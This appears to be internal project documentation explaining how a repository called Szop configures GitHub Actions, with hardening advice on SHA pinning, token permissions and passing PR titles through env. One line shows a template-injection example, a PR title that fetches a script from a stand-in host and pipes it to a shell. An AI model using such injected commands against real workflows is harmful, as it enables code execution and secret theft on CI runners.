# GitHub Actions

GitHub Actions is GitHub's built-in CI/CD service: it runs Szop's checks on every pull request and every push to `main`, and blocks the merge when one fails. How the checks fit together is in [CI/CD](../ci-cd.md); this page explains the tool and its files.

The words: a **workflow** is a YAML file in `.github/workflows/`, started by an event (a push, a PR, a schedule, a button). It holds **jobs**, which run in parallel unless one `needs` another, each on a fresh virtual machine, the **runner**, thrown away afterwards. A job is a list of **steps**: a shell script (`run:`) or an **action** (`uses:`), a reusable piece of automation published in a repository, such as `actions/checkout`.

## Why Szop uses it

[ADR 0010](../../decisions/0010-ci-cd.md), decisions 3–5: it is built into the repository, free and unlimited for public repositories, and release-please, Dependabot and CodeQL are native to it. GitLab CI would need the repository mirrored to a second platform; CircleCI and Buildkite are external services with their own accounts and secrets; AWS CodeBuild integrates poorly with PRs and is paid per minute. Runners are GitHub-hosted and pinned to `ubuntu-24.04`, so a new runner image never changes CI without a commit saying so.

## Configuration

**`.github/workflows/ci.yml`** holds the quality checks, **`.github/workflows/pr-title.yml`** the PR title check, and **`.github/actions/setup/action.yml`** the setup steps the jobs share, as a **composite action**: pnpm, Node from `.nvmrc`, and `pnpm install --frozen-lockfile` with the pnpm store cached. A composite action cannot check the repository out itself, since GitHub must clone the repository before it can read an action stored in it, so every job checks out first and then calls `uses: ./.github/actions/setup`. The settings, class by class:

- **Triggers (`on:`):** `ci.yml` runs on `pull_request` to `main` and `push` to `main`; `pr-title.yml` on `pull_request` of the types `opened`, `edited`, `synchronize` (a push) and `reopened`.
- **`concurrency`:** runs in the same group take turns. `ci.yml`'s group is the PR number (or the ref on `main`), and `cancel-in-progress` is on only for PRs, so a new push cancels the PR's older run, while a running run on `main` is never cancelled. `pr-title.yml` cancels the older run of the same PR.
- **`permissions`:** `{}` at the top takes every permission away from the token GitHub gives each job (`GITHUB_TOKEN`); each job then grants `contents: read` if it reads the repository. `ci-ok` keeps `{}`.
- **`needs` and `if`:** `needs:` makes a job wait for others and gives it their results and outputs; `if:` skips it unless a condition holds, for example `needs.changes.outputs.code == 'true'`. `ci-ok` has `if: always()`, so it runs even when a job it needs failed.
- **Outputs:** a step writes `name=value` lines to the file `$GITHUB_OUTPUT`; the job lists them under `outputs:`, and later jobs read them as `needs.<job>.outputs.<name>`.
- **The pinned `uses:` lines**, such as `actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1`. The part after `@` is a full commit SHA in the action's own repository: the commit that the release tag in the comment points to. A tag can be moved to other code at any time; a commit SHA cannot. In March 2025, attackers moved the version tags of `tj-actions/changed-files` to a commit that printed the workflows' secrets into their logs, and only workflows pinned to a SHA were safe. The comment is for humans and for Dependabot. To look a SHA up:

  ```bash
  gh api repos/actions/checkout/git/ref/tags/v7.0.1 --jq '.object.type + " " + .object.sha'
  # commit 3d3c42e5…  → that SHA is the pin
  gh api repos/pnpm/action-setup/git/ref/tags/v6.1.0 --jq '.object.type + " " + .object.sha'
  # tag d9184bf1…     → an annotated tag: ask for the commit it points to
  gh api repos/pnpm/action-setup/git/tags/d9184bf108216479bc5a137cc391f4d7b14c870b --jq .object.sha
  # ea17c68d…         → the pin
  ```

  zizmor's online audits check two things. First, that each pinned SHA is a real commit of the action's own repository, not an *impostor commit*: one that exists only in a fork, which GitHub still serves under the original repository's name. Second, that the version comment names a tag pointing to that SHA. Dependabot updates the SHA and the comment together. The commit of Szop that CI itself checks is not written in any file: GitHub decides it per run and passes it to the run as `GITHUB_SHA` (on a PR, the test merge commit; on a push, the pushed commit).
- **`persist-credentials: false`** on `actions/checkout`: by default the checkout leaves the token in `.git/config` for later steps to push with; Szop's jobs never push, so it is removed.
- **`env:` for untrusted values:** `pr-title.yml` passes the PR title as `PR_TITLE: ${{ github.event.pull_request.title }}` in `env:` and the script reads `"$PR_TITLE"`. Written straight into the script, a title such as `` x`curl evil.sh | sh` `` would run as code (*template injection*).

## Everyday use

- **The Actions tab** lists every run; a PR's checks box links each job's run (*Details*).
- **Re-running:** on a run's page, *Re-run jobs → Re-run failed jobs* reruns only what failed, for a network hiccup or a GitHub outage.
- From the terminal:

  ```bash
  gh pr checks                 # the current branch's PR: each check and its state
  gh run list --branch "$(git branch --show-current)"   # recent runs of this branch
  gh run view <run-id> --log-failed   # the logs of the failed steps only
  ```

- **Renaming a job:** `ci-ok` and `pr-title` are required checks, which GitHub matches by job name. Renaming either means updating the `main` ruleset in the same change ([GitHub settings](../github-settings.md#ruleset-for-main)), or every PR waits forever for the old name.
- **Adding a check job to `ci.yml`:** add it to `ci-ok`'s `needs:` list too, or its failure will not block the merge.
- **Adding an action:** pin it to a full commit SHA with the version in a comment (as above); the repository's Actions policy refuses to run a workflow with an unpinned action.

## Official documentation

- GitHub Actions: <https://docs.github.com/en/actions>
- Workflow syntax: <https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax>
- Secure use (pinning, script injection): <https://docs.github.com/en/actions/reference/security/secure-use>
- Composite actions: <https://docs.github.com/en/actions/tutorials/create-actions/create-a-composite-action>
- Concurrency: <https://docs.github.com/en/actions/how-tos/write-workflows/choose-when-workflows-run/control-workflow-concurrency>
